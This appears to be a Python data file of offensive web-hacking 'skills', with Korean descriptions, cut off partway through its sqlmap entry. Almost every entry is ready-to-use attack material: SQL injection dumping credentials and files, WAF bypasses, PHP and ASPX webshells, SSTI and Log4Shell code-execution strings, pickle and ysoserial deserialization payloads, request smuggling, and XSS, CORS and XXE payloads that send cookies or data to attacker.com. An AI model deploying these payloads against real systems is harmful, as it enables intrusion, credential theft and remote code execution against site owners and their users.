"""
로컬 SecSkills 완전 내장 데이터 (Downloads/skills 폴더)
=========================================================
출처:
  - SecSkills-main (~/Downloads/skills/SecSkills-main)
  - advsec-plus (~/Downloads/skills/advsec-plus)
  - api-unauth-fuzz (~/Downloads/skills/api-unauth-fuzz)
  - pentest-boundary (~/Downloads/skills/pentest-boundary)
  - skill-evolver (~/Downloads/skills/skill-evolver)
"""

SKILLS_DB_3: dict[str, dict] = {

# ══════════════════════════════════════════════════════════════
# SecSkills-main — 웹 취약점 상세 레퍼런스
# ══════════════════════════════════════════════════════════════

"sec-web-sqli": {
    "name": "SQL 인젝션 완전 레퍼런스",
    "module": "SecSkills-Web",
    "tags": ["sqli", "union", "error-based", "blind", "time-based", "waf-bypass"],
    "desc": "SQLi 전체 흐름: 탐지→UNION→에러→블라인드→파일R/W→WAF우회→SQLMap",
    "tools": ["sqlmap", "burpsuite", "ghauri"],
    "commands": [
        # 탐지
        "' OR '1'='1",
        "' ORDER BY 1--  (열수 탐지)",
        "' UNION SELECT NULL,NULL,NULL--",
        # UNION 추출
        "' UNION SELECT 1,database(),3--",
        "' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--",
        "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
        "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--",
        "' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--",
        # 에러 기반
        "' AND extractvalue(1,concat(0x7e,database()))--",
        "' AND updatexml(1,concat(0x7e,(SELECT user())),1)--",
        "' AND (SELECT 1 FROM(SELECT count(*),concat(database(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        # 시간 기반
        "' AND IF(1=1,SLEEP(3),0)--",
        "' AND IF((SELECT LENGTH(database()))>5,SLEEP(3),0)--",
        # 파일 읽기
        "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--",
        "' UNION SELECT 1,LOAD_FILE('C:\\\\Windows\\\\win.ini'),3--",
        # SQLMap
        "sqlmap -u 'http://target.com/page?id=1' --batch --dbs",
        "sqlmap -r request.txt --batch --level=5 --risk=3",
        "sqlmap -u URL --tamper=space2comment,randomcase,between --batch",
    ],
    "payloads": [
        "' OR '1'='1",
        "' UNION SELECT NULL,NULL,NULL--",
        "' AND extractvalue(1,concat(0x7e,database()))--",
        "' AND SLEEP(3)--",
        "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--",
    ],
    "notes": (
        "WAF 우회: 공백→/**/ %09 %0a, 키워드→대소문자혼합/인라인주석, "
        "information_schema 금지시 sys.schema_table_statistics 사용. "
        "DB별: MySQL(SLEEP), MSSQL(WAITFOR DELAY/xp_cmdshell), "
        "PostgreSQL(pg_sleep), Oracle(DBMS_PIPE). "
        "SQLMap tamper: space2comment/randomcase/between/charencode/versionedmorekeywords"
    ),
},

"sec-web-waf-bypass": {
    "name": "WAF/IDS 우회 완전 레퍼런스",
    "module": "SecSkills-Web",
    "tags": ["waf", "bypass", "encoding", "chunked", "hpp", "evasion"],
    "desc": "WAF 우회 전체 계층: 인코딩→대소문자→내인라인주석→HPP→청크전송→프로토콜→IP위조",
    "tools": ["burpsuite", "sqlmap", "ffuf"],
    "commands": [
        # 공백 우회
        "' UNION(SELECT(1),(2),(3))--   # 괄호로 공백 대체",
        "' UNION%0aSELECT%0a1,2,3--    # 뉴라인",
        "' UNION%09SELECT%091,2,3--    # TAB",
        "SELECT/**/*/**/FROM/**/users  # 주석으로 공백",
        "/*!50000SELECT*/ * FROM users  # MySQL 인라인 주석",
        # 키워드 우회
        "UNION → UNIUNIONON (이중 쓰기)",
        "SeLeCt * FrOm users          # 대소문자 혼합",
        # HTTP 파라미터 오염
        "?id=1&id=1' UNION SELECT 1,2,3--  # HPP",
        # IP 위조
        "X-Forwarded-For: 127.0.0.1",
        "X-Real-IP: 127.0.0.1",
        # Content-Type 전환
        'Content-Type: application/json  {"username": "admin\' OR 1=1--"}',
        # 경로 우회
        "/admin/../admin/login   # 경로 정규화 우회",
        "/%61dmin/login          # URL 인코딩 우회",
        "/ADMIN/login            # 대소문자 우회",
    ],
    "payloads": [
        "' UNION%0aSELECT%0aNULL,database(),NULL--",
        "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
        "X-Forwarded-For: 127.0.0.1",
        "UN/**/ION SEL/**/ECT 1,2,3",
    ],
    "notes": (
        "우회 흐름: 1.URL인코딩(단→이중) → 2.대소문자/주석 → 3.HPP → "
        "4.청크전송(Transfer-Encoding: chunked) → 5.Content-Type전환 → "
        "6.HTTP동사우회(GET→POST) → 7.IP위조헤더. "
        "SQLMap tamper 조합: space2comment,randomcase,between,charencode"
    ),
},

"sec-web-upload": {
    "name": "파일 업로드 완전 레퍼런스",
    "module": "SecSkills-Web",
    "tags": ["upload", "webshell", "extension-bypass", "content-bypass", "race-condition"],
    "desc": "파일 업로드 취약점: 후缀우회→내용우회→조건경쟁→그림마→해석취약점",
    "tools": ["burpsuite", "weevely", "exiftool"],
    "commands": [
        # 확장자 우회
        ".php → .php5 / .phtml / .pht / .phar / .phps",
        ".php → .PhP / .PHP5  # 대소문자",
        ".php → .php%00.jpg   # 널바이트 절단 (PHP<5.3.4)",
        ".php → .php.jpg      # Apache 이중 확장자",
        # Content-Type 우회
        "Content-Type: application/x-php → image/jpeg",
        # 매직 넘버 우회
        "echo 'GIF89a<?php @eval($_POST[1]);?>' > shell.gif",
        "exiftool -Comment='<?php @eval($_POST[1]);?>' image.jpg",
        # .htaccess 우회
        "echo 'AddType application/x-httpd-php .jpg' > .htaccess",
        # 조건 경쟁
        "while true; do curl -F 'file=@shell.php' target.com/upload & done",
        "while true; do curl target.com/uploads/shell.php && break; done",
        # 웹셸 실행 확인
        "curl 'https://target.com/uploads/shell.php?c=id'",
    ],
    "payloads": [
        "<?php @eval($_POST[1]);?>",
        "<?=system($_GET[1]);?>",
        "GIF89a\n<?php @eval($_POST[1]);?>",
        "<%@Page Language='C#'%><%System.Web.HttpContext.Current.Response.Write(System.Diagnostics.Process.Start('cmd','/c '+Request['cmd']).StandardOutput.ReadToEnd());%>",
    ],
    "notes": (
        "PHP 대안 확장자: .php5 .phtml .pht .phar .shtml. "
        "IIS6 해석취약점: shell.asp;.jpg → ASP 실행. "
        "Apache 이중확장자: shell.php.xxx (xxx미인식시 PHP해석). "
        "Nginx 0.7.65-: /uploads/file.jpg/.php → PHP 해석. "
        "조건경쟁: 업로드→저장→체크→삭제 사이 타이밍 공격"
    ),
},

"sec-web-rce": {
    "name": "원격 코드 실행(RCE) 완전 레퍼런스",
    "module": "SecSkills-Web",
    "tags": ["rce", "command-injection", "ssti", "deserialization", "log4j"],
    "desc": "RCE 전체: 커맨드인젝션→SSTI→Log4Shell→역직렬화→eval주입",
    "tools": ["burpsuite", "commix", "ysoserial"],
    "commands": [
        # 커맨드 인젝션
        "; id",
        "| whoami",
        "` id `",
        "$(id)",
        "& whoami &",
        "|| id",
        "%0a id",
        # OOB 탐지
        "; curl http://collaborator.com/$(id)",
        # SSTI
        "{{7*7}}  → 49: Jinja2/Twig",
        "${7*7}   → 49: FreeMarker",
        "#{7*7}   → 49: Thymeleaf",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        # Log4Shell
        "${jndi:ldap://attacker.com/x}",
        "${jndi:dns://attacker.com/x}",
        "${${lower:j}ndi:${lower:l}dap://attacker.com/x}",
        # PHP eval 인젝션
        "/?search=<?php system('id');?>",
        # Node.js
        "require('child_process').execSync('id').toString()",
    ],
    "payloads": [
        "; id",
        "$(id)",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "${jndi:ldap://attacker.com/x}",
        "{{7*7}}",
    ],
    "notes": (
        "SSTI 식별: {{7*7}}=49(Jinja2), ${7*7}=49(FreeMarker), #{7*7}(Thymeleaf). "
        "Log4Shell(CVE-2021-44228): log4j 2.x의 ${jndi:ldap://} 인젝션. "
        "PHP eval: preg_replace /e 플래그, assert() 약점 주의. "
        "역직렬화: ysoserial로 페이로드 생성, Java/PHP/Python 모두 해당"
    ),
},

"sec-web-xss": {
    "name": "XSS 완전 레퍼런스",
    "module": "SecSkills-Web",
    "tags": ["xss", "reflected", "stored", "dom", "csp-bypass", "cookie-theft"],
    "desc": "XSS 3종: 반사형/저장형/DOM. 쿠키탈취, BeEF, CSP우회",
    "tools": ["dalfox", "xsstrike", "burpsuite", "beef"],
    "commands": [
        "dalfox url 'https://target.com/search?q=test'",
        "xsstrike -u 'https://target.com/search?q=FUZZ'",
        # 기본 페이로드
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "'\"><script>alert(1)</script>",
        # 필터 우회
        "<ScRiPt>alert(1)</ScRiPt>",
        "<img src=x onerror=confirm`1`>",
        "<body onload=alert(document.cookie)>",
        "{{constructor.constructor('alert(1)')()}}",
        # 쿠키 탈취
        "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
        "<img src=x onerror=\"fetch('http://attacker.com/?c='+document.cookie)\">",
        # BeEF 훅
        "<script src=http://attacker.com:3000/hook.js></script>",
    ],
    "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
    ],
    "notes": (
        "CSP 우회: JSONP 엔드포인트, base-uri 미설정, nonce 예측, unsafe-eval. "
        "DOM XSS 소스: location.hash, document.URL, postMessage. "
        "DOM XSS 싱크: innerHTML, document.write, eval, location.href. "
        "필터 우회: 대소문자, 이벤트핸들러 변형, HTML5 태그(audio/video/details)"
    ),
},

"sec-web-ssrf": {
    "name": "SSRF 완전 레퍼런스",
    "module": "SecSkills-Web",
    "tags": ["ssrf", "aws-metadata", "internal-network", "gopher", "dns-rebinding"],
    "desc": "SSRF: AWS메타데이터탈취→내부서비스접근→Gopher프로토콜→DNS리바인딩",
    "tools": ["burpsuite", "ssrfmap", "gopherus"],
    "commands": [
        # 기본 테스트
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://localhost:80/admin",
        "http://127.0.0.1:8080/api/internal",
        "file:///etc/passwd",
        # 우회
        "http://0x7f000001/  # 127.0.0.1 HEX",
        "http://2130706433/  # 127.0.0.1 10진수",
        "http://①②⑦.⓪.⓪.①  # 유니코드",
        "http://127.0.0.1@evil.com/  # @ 앞 무시",
        # GCP
        "http://metadata.google.internal/computeMetadata/v1/ -H 'Metadata-Flavor: Google'",
        # Azure
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H 'Metadata: true'",
        # 내부 서비스
        "dict://127.0.0.1:6379/info   # Redis",
        "gopher://127.0.0.1:3306/...  # MySQL Gopher",
        "http://127.0.0.1:9200/       # Elasticsearch",
    ],
    "payloads": [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://localhost:80/admin",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/info",
    ],
    "notes": (
        "AWS IMDSv1: GET 요청만으로 메타데이터 접근. "
        "IMDSv2: PUT으로 토큰 요청 후 접근. "
        "127.0.0.1 우회: 0x7f000001, 2130706433, 127.1, 0.0.0.0, localhost. "
        "DNS 리바인딩: 내부IP로 리다이렉션. "
        "Gopher: Redis/MySQL/SMTP 등 raw TCP 프로토콜 접근"
    ),
},

"sec-web-lfi": {
    "name": "LFI/경로탐색 완전 레퍼런스",
    "module": "SecSkills-Web",
    "tags": ["lfi", "rfi", "path-traversal", "log-poisoning", "php-wrapper"],
    "desc": "LFI: 경로탐색→PHP래퍼→로그오염→원격파일포함→zip래퍼",
    "tools": ["burpsuite", "dotdotpwn"],
    "commands": [
        # 기본 LFI
        "?page=../../../../etc/passwd",
        "?page=../../../../etc/passwd%00  # 널바이트 절단",
        "?page=....//....//etc/passwd    # 이중 슬래시 우회",
        "?page=..%2F..%2F..%2Fetc%2Fpasswd  # URL 인코딩",
        # PHP 래퍼
        "?file=php://filter/convert.base64-encode/resource=index.php",
        "?file=php://filter/read=string.toupper/resource=index.php",
        "?file=php://input   (POST에 PHP코드 포함)",
        "?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
        # 로그 오염 (Log Poisoning)
        "User-Agent: <?php system($_GET['c']); ?>  # 먼저 로그에 주입",
        "?file=../../../../var/log/apache2/access.log&c=id",
        "?file=../../../../var/log/nginx/access.log&c=whoami",
        "?file=../../../../proc/self/environ&c=id  # 환경변수",
        # SSH 로그
        "ssh '<?php system($_GET[c]);?>'@target.com",
        "?file=../../../../var/log/auth.log&c=id",
        # Zip 래퍼 (파일업로드 병행)
        "?file=zip://uploads/shell.zip%23shell.php",
    ],
    "payloads": [
        "../../../../etc/passwd",
        "php://filter/convert.base64-encode/resource=config.php",
        "../../../../var/log/apache2/access.log",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
    ],
    "notes": (
        "일반 LFI 읽기 대상: /etc/passwd, /etc/shadow, /var/www/html/config.php, "
        "PHP 세션(/tmp/sess_XXXX). "
        "로그 오염: User-Agent에 PHP 코드 삽입 후 로그 경로로 LFI. "
        "PHP 래퍼: php://filter(소스 읽기), php://input(코드 실행), data://(인라인 코드). "
        "우회: ../ → ....// → ..%2f → %2e%2e%2f"
    ),
},

"sec-web-auth": {
    "name": "인증 로직 우회 완전 레퍼런스",
    "module": "SecSkills-Web",
    "tags": ["auth-bypass", "jwt", "session", "oauth", "password-reset"],
    "desc": "인증 우회: JWT조작→OAuth결함→비밀번호재설정→세션고정→SQL인젝션로그인",
    "tools": ["burpsuite", "jwt_tool"],
    "commands": [
        # JWT 공격
        "python3 jwt_tool.py TOKEN -T    # JWT 조작 인터랙티브",
        "python3 jwt_tool.py TOKEN -X a  # alg:none 공격",
        "python3 jwt_tool.py TOKEN -C -d rockyou.txt  # HS256 비밀 브루트포스",
        "python3 jwt_tool.py TOKEN -X k  # RS256→HS256 키 혼동",
        # SQL 인젝션 로그인 우회
        "admin'--   (비밀번호 필드)",
        "' OR '1'='1'--",
        "admin' #",
        "') OR ('1'='1",
        # 비밀번호 재설정 결함
        "HOST: evil.com  # Host Header로 재설정 링크 탈취",
        "?token=   # 빈 토큰",
        "?email=victim@site.com&email=attacker@site.com  # HPP",
        # OAuth 결함
        "redirect_uri=https://attacker.com  # 열린 리다이렉트",
        "state 파라미터 없음 → CSRF 가능",
    ],
    "payloads": [
        "admin'--",
        "' OR '1'='1'--",
        "admin' #",
        "Authorization: Bearer eyJ..[수정된 alg:none JWT]..",
    ],
    "notes": (
        "JWT alg:none: 헤더의 alg를 'none'으로 변경, 서명 제거. "
        "JWT HS256→RS256: 공개키를 HS256 비밀로 사용. "
        "비밀번호 재설정: Host Header 인젝션으로 링크를 공격자 서버로 유도. "
        "세션 고정: 로그인 전후 세션ID 동일 여부 확인. "
        "비밀번호 재설정 토큰 예측: 타임스탬프/md5/랜덤 부족"
    ),
},

"sec-web-ssti": {
    "name": "SSTI 서버 사이드 템플릿 인젝션",
    "module": "SecSkills-Web",
    "tags": ["ssti", "jinja2", "twig", "freemarker", "thymeleaf", "rce"],
    "desc": "SSTI: 템플릿 엔진 식별→RCE→파일 읽기→리버스 셸",
    "tools": ["burpsuite", "tplmap"],
    "commands": [
        # 탐지
        "{{7*7}}   → 49:  Jinja2(Python), Twig(PHP)",
        "${7*7}    → 49:  FreeMarker(Java)",
        "#{7*7}    → 49:  Thymeleaf(Java)",
        "<%= 7*7 %> → 49: ERB(Ruby)",
        "{{ 7 * 7 }}  → 49: Pebble, Liqiud",
        # Jinja2 RCE
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        # Twig RCE
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        # FreeMarker RCE
        "<#assign ex = 'freemarker.template.utility.Execute'?new()>${ex('id')}",
        # tplmap 자동화
        "python2 tplmap.py -u 'http://target.com/?name=*'",
    ],
    "payloads": [
        "{{7*7}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "${7*7}",
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
    ],
    "notes": (
        "템플릿 엔진 식별 흐름: {{7*7}}→49 확인. "
        "Jinja2: MRO 체인으로 서브클래스 탐색 후 subprocess/popen 호출. "
        "FreeMarker: Execute 클래스를 직접 인스턴스화. "
        "Twig: _self.env로 내부 함수 접근. "
        "tplmap 자동화 도구로 여러 엔진 한번에 테스트"
    ),
},

"sec-web-xxe": {
    "name": "XXE XML 외부 엔티티 인젝션",
    "module": "SecSkills-Web",
    "tags": ["xxe", "xml", "file-read", "ssrf", "out-of-band"],
    "desc": "XXE: 파일읽기→SSRF→OOB→파라미터엔티티→SVG/docx XXE",
    "tools": ["burpsuite"],
    "commands": [
        # 기본 파일 읽기
        """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>""",
        # SSRF
        """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>""",
        # OOB (콜백)
        """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
<root>test</root>""",
        # PHP 래퍼 (base64 인코딩으로 파일 읽기)
        """<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">""",
        # SVG XXE
        """<svg><image href="http://attacker.com/?x=&xxe;"/></svg>""",
    ],
    "payloads": [
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>',
    ],
    "notes": (
        "탐지: XML 파싱 응답에서 엔티티 확장 여부 확인. "
        "OOB: 직접 회신 없을 때 DNS/HTTP 콜백(collaborator.com). "
        "evil.dtd 내용: <!ENTITY % data SYSTEM 'file:///etc/passwd'> "
        "<!ENTITY % all '<!ENTITY &#x25; send SYSTEM \"http://attacker.com/?d=%data;\">'>. "
        "SVG/docx/xlsx 파일 업로드에도 XXE 적용 가능"
    ),
},

"sec-web-graphql": {
    "name": "GraphQL 보안 테스트",
    "module": "SecSkills-Web",
    "tags": ["graphql", "introspection", "injection", "batching"],
    "desc": "GraphQL: 인트로스펙션→필드제안→SQL/NoSQL인젝션→배치쿼리공격",
    "tools": ["burpsuite", "graphw00f", "inql"],
    "commands": [
        # 인트로스펙션
        "{__schema{types{name}}}",
        "{__schema{queryType{fields{name}}}}",
        "{__schema{types{name fields{name type{name}}}}}",
        # graphw00f 탐지
        "graphw00f -u https://target.com/graphql",
        # 인트로스펙션 비활성화 우회
        "{__schema\n{types{name}}}  # 줄바꿈 우회",
        # SQL 인젝션 (인자에 직접 주입)
        '{user(id:"1 OR 1=1"){ id name email }}',
        # 배치 쿼리 (DoS)
        "[{query: '{user{id}}'}, {query: '{user{id}}'}, ...]  # 배열로 100개",
        # 필드 제안으로 숨겨진 필드 발견
        '{user{password}}  # 스키마에 없어도 시도',
    ],
    "payloads": [
        "{__schema{types{name}}}",
        "{user(id:\"1 OR 1=1\"){id name email password}}",
    ],
    "notes": (
        "GraphQL 엔드포인트: /graphql, /api/graphql, /v1/graphql, /query. "
        "인트로스펙션 비활성화 우회: 대소문자, 줄바꿈, 별칭. "
        "클레이어보이언스: 비활성화된 인트로스펙션에서도 단어 기반 필드명 추측. "
        "배치 쿼리 DoS: 배열로 수백 개 쿼리 동시 전송. "
        "구독(Subscription): WebSocket을 통한 실시간 취약점"
    ),
},

"sec-web-cors": {
    "name": "CORS 오설정 테스트",
    "module": "SecSkills-Web",
    "tags": ["cors", "misconfiguration", "credential-theft"],
    "desc": "CORS 오설정: Origin반사→null→와일드카드→subdomain탈취",
    "tools": ["burpsuite", "corsy"],
    "commands": [
        # CORS 테스트
        "curl -H 'Origin: https://evil.com' -I https://target.com/api/user",
        "curl -H 'Origin: https://evil.com' -I https://target.com/api/user | grep -i cors",
        # null Origin
        "Origin: null",
        # 서브도메인
        "Origin: https://evil.target.com",
        "Origin: https://target.com.evil.com",
        # POC
        """<script>
fetch('https://target.com/api/sensitive', {credentials:'include'})
.then(r=>r.text()).then(d=>fetch('https://attacker.com/?d='+btoa(d)))
</script>""",
    ],
    "payloads": [
        "Origin: https://evil.com",
        "Origin: null",
        "Origin: https://evil.target.com",
    ],
    "notes": (
        "취약 패턴: Access-Control-Allow-Origin: <요청Origin> + Allow-Credentials: true. "
        "null Origin: Iframe sandbox에서 null Origin 발생 → 허용하면 취약. "
        "탐지: Origin 헤더 반사 여부 + Allow-Credentials 확인. "
        "subdomain XSS+CORS 체인: 서브도메인의 XSS로 메인 도메인 API 접근"
    ),
},

"sec-web-deser": {
    "name": "역직렬화 취약점",
    "module": "SecSkills-Web",
    "tags": ["deserialization", "java", "php", "python", "ysoserial"],
    "desc": "역직렬화: Java(ysoserial)→PHP(object injection)→Python(pickle)→.NET",
    "tools": ["ysoserial", "burpsuite"],
    "commands": [
        # Java ysoserial
        "java -jar ysoserial.jar CommonsCollections6 'id > /tmp/pwned' | base64",
        "java -jar ysoserial.jar CommonsCollections7 'curl http://attacker.com/?x=$(id)' | base64",
        # PHP 역직렬화
        "O:8:\"stdClass\":1:{s:4:\"test\";s:2:\"hi\";}  # 기본 형식",
        # Python Pickle
        """import pickle,os,base64
class E(object):
    def __reduce__(self): return (os.system,('id',))
print(base64.b64encode(pickle.dumps(E())))""",
    ],
    "payloads": [
        "java -jar ysoserial.jar CommonsCollections6 'id' | base64",
        "rO0ABXNyAC5vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMu...",
    ],
    "notes": (
        "Java 탐지: Base64 rO0AB 또는 ac ed 0005 헤더. "
        "PHP 탐지: O:숫자:'클래스명' 패턴 검색. "
        "Python Pickle: pickle.loads(user_input) → RCE. "
        "가젯 체인: CommonsCollections1-7, Spring, Groovy, JRMPClient. "
        ".NET ViewState: MAC 키 없으면 역직렬화 RCE"
    ),
},

"sec-web-http-smuggling": {
    "name": "HTTP 요청 스머글링",
    "module": "SecSkills-Web",
    "tags": ["http-smuggling", "cl-te", "te-cl", "request-splitting"],
    "desc": "HTTP 스머글링: CL.TE→TE.CL→TE.TE→캐시포이즈닝→인증우회",
    "tools": ["burpsuite-turbo-intruder", "smuggler"],
    "commands": [
        # CL.TE 탐지
        """POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED""",
        # 스머글링 POC
        """POST / HTTP/1.1
Host: target.com
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /admin HTTP/1.1
X-Ignore: X""",
        # smuggler 자동화
        "python3 smuggler.py -u https://target.com",
    ],
    "payloads": [
        "Transfer-Encoding: chunked (CL.TE 공격)",
        "Content-Length: X (TE.CL 공격)",
    ],
    "notes": (
        "CL.TE: 프론트는 Content-Length, 백엔드는 Transfer-Encoding 우선. "
        "TE.CL: 프론트는 Transfer-Encoding, 백엔드는 Content-Length 우선. "
        "TE.TE: 두 서버 모두 Transfer-Encoding 지원하나 난독화로 혼동. "
        "활용: 어드민 패널 접근, 요청 도용, 캐시 포이즈닝, WAF 우회"
    ),
},

"sec-web-race": {
    "name": "레이스 컨디션 취약점",
    "module": "SecSkills-Web",
    "tags": ["race-condition", "toctou", "concurrent", "limit-bypass"],
    "desc": "레이스 컨디션: 쿠폰중복→잔액초과인출→파일경쟁→포인트중복적립",
    "tools": ["burpsuite-turbo-intruder", "ffuf"],
    "commands": [
        # Turbo Intruder 병렬 공격 (bash+xargs)
        "printf '%s\\n' $(seq 50) | xargs -P50 -I{} curl -sk -m 10 -X POST 'https://target.com/redeem' "
        "-d 'code=PROMO50' -H 'Cookie: session=xxx' -o /tmp/race_{}.txt -w '%{http_code}\\n' | sort | uniq -c",
        # ffuf 병렬
        "ffuf -u https://target.com/transfer -X POST -d 'amount=1000' -H 'Cookie: sess=X' -w /dev/null -rate 100",
    ],
    "payloads": [
        "동시 50개 요청으로 쿠폰 1개를 50번 사용",
        "동시 요청으로 잔액 0 이하 인출",
    ],
    "notes": (
        "취약 패턴: 1.읽기 2.검증 3.쓰기 사이의 TOCTOU(검사-사용 시점 차이). "
        "HTTP/2 단일 패킷: 여러 요청을 동일 TCP 패킷에 → 동시 도달 보장. "
        "Burp Turbo Intruder: single-packet-attack 모드 사용. "
        "대상: 쿠폰/포인트/잔액/좋아요/투표 등 1회 제한 기능"
    ),
},

"sec-web-cache-poison": {
    "name": "웹 캐시 포이즈닝",
    "module": "SecSkills-Web",
    "tags": ["cache-poisoning", "host-header", "xss", "dos"],
    "desc": "캐시 포이즈닝: Host헤더→X-Forwarded-Host→캐시XSS→DoS",
    "tools": ["burpsuite", "param-miner"],
    "commands": [
        # 기본 테스트
        "X-Forwarded-Host: evil.com  # 캐시된 응답에 악성 Host 삽입",
        "X-Host: evil.com",
        "X-Forwarded-Scheme: https",
        # param-miner
        "Burp Extensions → Param Miner → Guess parameters (캐시 키 외 파라미터 탐지)",
        # 검증
        "curl -H 'X-Forwarded-Host: evil.com' https://target.com/ -I | grep Location",
    ],
    "payloads": [
        "X-Forwarded-Host: evil.com</title><script>alert(1)</script>",
        "X-Cache-Status: HIT (캐시 히트 확인)",
    ],
    "notes": (
        "취약 조건: 캐시가 Host 헤더를 캐시 키에 포함 안하면서 응답에 반영. "
        "Unkeyed Header: X-Forwarded-Host, X-Host, X-Forwarded-Scheme. "
        "Web Cache Deception: /account.php/nonexistent.css → 캐시됨. "
        "Param Miner로 언키드 파라미터 자동 탐지"
    ),
},

"sec-web-crlf": {
    "name": "CRLF 인젝션 / HTTP 응답 분할",
    "module": "SecSkills-Web",
    "tags": ["crlf", "response-splitting", "header-injection", "xss"],
    "desc": "CRLF: 헤더인젝션→응답분할→쿠키설정→XSS",
    "tools": ["burpsuite"],
    "commands": [
        # 기본 테스트
        "?url=https://target.com%0d%0aSet-Cookie:admin=1",
        "?redirect=https://target.com%0d%0a%0d%0a<script>alert(1)</script>",
        "?page=test%0aSet-Cookie:%20session=hijacked",
        # 헤더 인젝션
        "GET /redirect?url=javascript:alert(1)%0d%0aX-Injected:true HTTP/1.1",
    ],
    "payloads": [
        "%0d%0aSet-Cookie:admin=1",
        "%0d%0a%0d%0a<script>alert(1)</script>",
    ],
    "notes": (
        "CRLF: \\r\\n (0x0D 0x0A) = HTTP 헤더 구분자. "
        "인코딩: %0d%0a (URL), %250d%250a (이중 URL). "
        "취약 위치: redirect URL, Set-Cookie 값, Location 헤더. "
        "활용: 쿠키 설정, 응답 분할로 본문 조작, 캐시 포이즈닝, XSS"
    ),
},

"sec-web-host-header": {
    "name": "Host 헤더 인젝션",
    "module": "SecSkills-Web",
    "tags": ["host-header", "password-reset", "cache-poison", "ssrf"],
    "desc": "Host 헤더 인젝션: 비밀번호재설정→SSRF→캐시포이즈닝→가상호스트우회",
    "tools": ["burpsuite"],
    "commands": [
        # 비밀번호 재설정 탈취
        "Host: evil.com  # 재설정 링크가 evil.com 도메인으로 생성됨",
        "Host: target.com:443@evil.com",
        "Host: evil.com#target.com",
        "X-Forwarded-Host: evil.com",
        # 내부 접근
        "Host: localhost",
        "Host: 127.0.0.1",
        "Host: internal-service",
    ],
    "payloads": [
        "Host: evil.com",
        "Host: target.com.evil.com",
        "X-Forwarded-Host: evil.com",
        "Host: localhost",
    ],
    "notes": (
        "비밀번호 재설정: 서버가 Host 헤더로 도메인 생성 → 공격자 도메인으로 링크. "
        "이중 Host: 두 번째 Host를 서버가 우선 사용하는 경우. "
        "내부 시스템 접근: Host: localhost → 내부 관리 인터페이스. "
        "방어: Host 화이트리스트 검증 필수"
    ),
},

# ══════════════════════════════════════════════════════════════
# SecSkills-main — 도구 레퍼런스
# ══════════════════════════════════════════════════════════════

"sec-tools-sqlmap": {
    "name": "SQLMap 완전 레퍼런스",
    "module": "SecSkills-Tools",
    "tags": ["sqlmap", "automation", "tamper"],
    "desc": "SQLMap 전체 옵션: 기본→고급→tamper→os-shell→파일R/W",
    "tools": ["sqlmap"],
    "commands": [
        # 기본
        "sqlmap -u 'http://target.com/page?id=1' --batch --random-agent",
        "sqlmap -u URL --dbs",
        "sqlmap -u URL -D dbname --tables",
        "sqlmap -u URL -D dbname -T users --columns",
        "sqlmap -u URL -D dbname -T users -C user,pass --dump",
        # Burp 요청 파일
        "sqlmap -r request.txt --batch",
        "sqlmap -r request.txt --batch --level=5 --risk=3",
        # WAF 우회 tamper
        "sqlmap -u URL --tamper=space2comment,randomcase,between --batch",
        "sqlmap -u URL --tamper=space2comment,randomcase,charencode,versionedmorekeywords --batch",
        # 고급
        "sqlmap -u URL --os-shell",
        "sqlmap -u URL --file-read '/etc/passwd'",
        "sqlmap -u URL --file-write 'shell.php' --file-dest '/var/www/html/shell.php'",
        "sqlmap -u URL --proxy=http://127.0.0.1:8080  # Burp 프록시 통과",
        # POST 요청
        "sqlmap -u URL --data='id=1&name=test' -p id --batch",
        # Cookie
        "sqlmap -u URL --cookie='PHPSESSID=xxx; admin=1' --batch",
    ],
    "payloads": [],
    "notes": (
        "tamper 목록: space2comment(공백→/**/), randomcase(랜덤대소문자), "
